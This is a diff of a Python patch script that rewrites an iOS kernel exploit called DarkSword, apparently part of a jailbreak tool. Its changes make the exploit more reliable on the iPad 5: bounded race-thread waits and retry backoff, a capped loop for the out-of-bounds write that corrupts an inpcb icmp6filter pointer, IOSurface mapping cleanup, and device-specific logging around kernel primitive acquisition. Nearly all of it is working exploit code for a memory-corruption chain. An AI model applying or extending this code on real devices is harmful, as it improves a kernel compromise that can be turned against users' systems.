@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
-"""Apply an iPad 5 DarkSword diagnostic-only patch.
+"""Apply the iPad 5 DarkSword stability and diagnostic patch.
 
-This intentionally preserves upstream DarkSword heap geometry, socket spray
-count, race limits, and cleanup order. It only adds iPad 5 logging and validates
-errors returned while creating/querying sprayed sockets.
+This keeps the upstream heap geometry and socket-spray parameters, while fixing
+unbounded busy-waits and an IOSurface retention leak that can trigger iOS CPU
+watchdog reports on the two-core iPad 5. It also preserves detailed persistent
+stage logging for field diagnostics.
 """
 
 from pathlib import Path
@@ -17,6 +18,15 @@ def replace_once(text: str, old: str, new: str, label: str) -> str:
     if count != 1:
         raise RuntimeError(f"{label}: expected exactly one match, found {count}")
     return text.replace(old, new, 1)
+
+
+def replace_exact_count(
+    text: str, old: str, new: str, expected: int, label: str
+) -> str:
+    count = text.count(old)
+    if count != expected:
+        raise RuntimeError(f"{label}: expected {expected} matches, found {count}")
+    return text.replace(old, new)
 
 
 def patch_darksword(text: str) -> str:
@@ -92,7 +102,7 @@ static void ipad5_enable_persistent_log(void)
     }
     setvbuf(stdout, NULL, _IONBF, 0);
     setvbuf(stderr, NULL, _IONBF, 0);
-    ipad5_log_stage("session", "diagnostic-only profile; upstream exploit parameters preserved");
+    ipad5_log_stage("session", "stability profile; upstream exploit geometry preserved");
 }
 
 '''
@@ -101,6 +111,69 @@ static void ipad5_enable_persistent_log(void)
         "pthread_t freeThread;\n",
         log_helpers + "pthread_t freeThread;\n",
         "logging helpers",
+    )
+
+    text = replace_once(
+        text,
+        r'''void *free_thread(void *arg)
+{
+    while (freeThreadStart == 0);
+
+    while (goSync == 0);
+
+    while (goSync != 0) {
+        while (raceSync == 0);
+''',
+        r'''void *free_thread(void *arg)
+{
+    while (freeThreadStart == 0) usleep(250);
+
+    while (goSync == 0) usleep(250);
+
+    while (goSync != 0) {
+        while (raceSync == 0 && goSync != 0) usleep(50);
+        if (goSync == 0) break;
+''',
+        "free-thread watchdog-safe waits",
+    )
+
+    text = replace_exact_count(
+        text,
+        "        while (raceSync == 1);\n",
+        "        while (raceSync == 1) usleep(10);\n",
+        2,
+        "race completion waits",
+    )
+
+    text = replace_once(
+        text,
+        r'''kern_return_t physical_oob_read_mo_with_retry(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)
+{
+    kern_return_t kr;
+    do {
+        kr = physical_oob_read_mo(memoryObject, memoryObjectOffset, size, offset, buffer);
+    } while (kr != KERN_SUCCESS);
+    return kr;
+}
+''',
+        r'''kern_return_t physical_oob_read_mo_with_retry(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)
+{
+    kern_return_t kr;
+    unsigned retryCount = 0;
+    do {
+        kr = physical_oob_read_mo(memoryObject, memoryObjectOffset, size, offset, buffer);
+        if (kr != KERN_SUCCESS) {
+            retryCount++;
+            if (isIPad5Device && (retryCount % 64) == 0) {
+                ipad5_log_stage("oob-read-retry", "race has not succeeded yet; yielding CPU");
+            }
+            usleep(250);
+        }
+    } while (kr != KERN_SUCCESS);
+    return kr;
+}
+''',
+        "OOB read retry backoff",
     )
 
     old_spray = r'''    fileport_t outputSocketPort = 0;
@@ -154,6 +227,40 @@ static void ipad5_enable_persistent_log(void)
 
     text = replace_once(
         text,
+        r'''        printf("[+] Corrupting icmp6filter pointer...\n");
+        while (true) {
+            physical_oob_write_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, writeBuffer);
+            physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
+            uint64_t newIcmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + koffsetof(inpcb, icmp6filt));
+            if (newIcmp6Filter == inpListNextPointer + koffsetof(inpcb, icmp6filt)) {
+                printf("[+] target corrupted: %#llx\n", *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + koffsetof(inpcb, icmp6filt)));
+                break;
+            }
+        }
+''',
+        r'''        printf("[+] Corrupting icmp6filter pointer...\n");
+        bool corruptionApplied = false;
+        for (unsigned corruptTry = 0; corruptTry < 256; corruptTry++) {
+            physical_oob_write_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, writeBuffer);
+            physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
+            uint64_t newIcmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + koffsetof(inpcb, icmp6filt));
+            if (newIcmp6Filter == inpListNextPointer + koffsetof(inpcb, icmp6filt)) {
+                printf("[+] target corrupted: %#llx\n", *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + koffsetof(inpcb, icmp6filt)));
+                corruptionApplied = true;
+                break;
+            }
+            usleep(250);
+        }
+        if (!corruptionApplied) {
+            if (isIPad5Device) ipad5_log_stage("corruption-retry", "bounded corruption attempt exhausted; continuing search");
+            return -1;
+        }
+''',
+        "bounded socket corruption retry",
+    )
+
+    text = replace_once(
+        text,
         "    NSMutableArray *targetInpGencntList = [NSMutableArray new];\n    while (true) {\n",
         "    NSMutableArray *targetInpGencntList = [NSMutableArray new];\n"
         "    while (true) {\n"
@@ -180,16 +287,56 @@ static void ipad5_enable_persistent_log(void)
         "socket diagnostics",
     )
 
+    text = replace_once(
+        text,
+        r'''        for (uint64_t s = 0; s < searchMappingNum; s++) {
+            mach_vm_address_t searchMappingAddress = searchMappings.lastObject.unsignedLongLongValue;
+            [searchMappings removeLastObject];
+            kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);
+        }
+''',
+        r'''        for (uint64_t s = 0; s < searchMappingNum; s++) {
+            mach_vm_address_t searchMappingAddress = searchMappings.lastObject.unsignedLongLongValue;
+            [searchMappings removeLastObject];
+            surface_munlock(searchMappingAddress, searchMappingSize);
+            kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);
+        }
+''',
+        "release retained IOSurface mappings",
+    )
+
+    text = replace_once(
+        text,
+        r'''        if (success == true) {
+            break;
+        }
+    }
+}
+''',
+        r'''        if (success == true) {
+            break;
+        }
+        if (isIPad5Device) {
+            ipad5_log_memory("pass-memory-cleaned");
+            ipad5_log_stage("heap-pass-retry", "cleanup complete; backing off before retry");
+            usleep(250000);
+        }
+    }
+}
+''',
+        "iPad 5 failed-pass backoff",
+    )
+
     old_detect = r'''    isA18Device = (bool)strstr(name.machine, "iPhone17,");
 
     if (isA18Device) {
 '''
     new_detect = r'''    isIPad5Device = (bool)(strstr(name.machine, "iPad6,11") ||
-                                 strstr(name.machine, "iPad6,12"));
+                                  strstr(name.machine, "iPad6,12"));
     if (isIPad5Device) {
         ipad5_enable_persistent_log();
         char detail[192] = {0};
-        snprintf(detail, sizeof(detail), "model=%s; stock DarkSword parameters", name.machine);
+        snprintf(detail, sizeof(detail), "model=%s; watchdog-safe DarkSword parameters", name.machine);
         ipad5_log_stage("exploit-init", detail);
         ipad5_log_memory("exploit-memory-start");
     }
@@ -203,7 +350,7 @@ static void ipad5_enable_persistent_log(void)
     text = replace_once(
         text,
         "        pe_init();\n        pe_v1();\n",
-        "        if (isIPad5Device) ipad5_log_stage(\"primitive-init\", \"starting stock DarkSword path\");\n"
+        "        if (isIPad5Device) ipad5_log_stage(\"primitive-init\", \"starting watchdog-safe DarkSword path\");\n"
         "        pe_init();\n"
         "        pe_v1();\n"
         "        if (isIPad5Device) ipad5_log_stage(\"pe-v1-success\", \"early kernel primitive acquired\");\n",
@@ -215,8 +362,8 @@ static void ipad5_enable_persistent_log(void)
 
 def patch_jailbreaker(text: str) -> str:
     old = "    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@\"Exploiting Kernel (%@)\"), kernelExploit.name] debug:NO];\n    if ([kernelExploit load] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@\"Failed to load kernel exploit: %s\", dlerror()]}];\n    if ([kernelExploit run] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@\"Failed to exploit kernel\"}];\n"
-    new = "    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@\"Exploiting Kernel (%@)\"), kernelExploit.name] debug:NO];\n    [[DOUIManager sharedInstance] sendLog:@\"DarkSword baseline: upstream exploit parameters preserved\" debug:NO];\n    if ([kernelExploit load] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@\"Failed to load kernel exploit: %s\", dlerror()]}];\n    if ([kernelExploit run] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@\"Failed to exploit kernel\"}];\n"
-    return replace_once(text, old, new, "jailbreak UI baseline marker")
+    new = "    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@\"Exploiting Kernel (%@)\"), kernelExploit.name] debug:NO];\n    [[DOUIManager sharedInstance] sendLog:@\"DarkSword iPad 5: CPU watchdog and IOSurface cleanup enabled\" debug:NO];\n    if ([kernelExploit load] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@\"Failed to load kernel exploit: %s\", dlerror()]}];\n    if ([kernelExploit run] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@\"Failed to exploit kernel\"}];\n"
+    return replace_once(text, old, new, "jailbreak UI stability marker")
 
 
 def main() -> None:
@@ -226,7 +373,7 @@ def main() -> None:
     jailbreaker = JAILBREAKER.read_text(encoding="utf-8")
     JAILBREAKER.write_text(patch_jailbreaker(jailbreaker), encoding="utf-8")
 
-    print("Applied diagnostic-only iPad 5 patch; upstream exploit behavior preserved")
+    print("Applied iPad 5 DarkSword CPU-watchdog and IOSurface-leak fixes")
 
 
 if __name__ == "__main__":
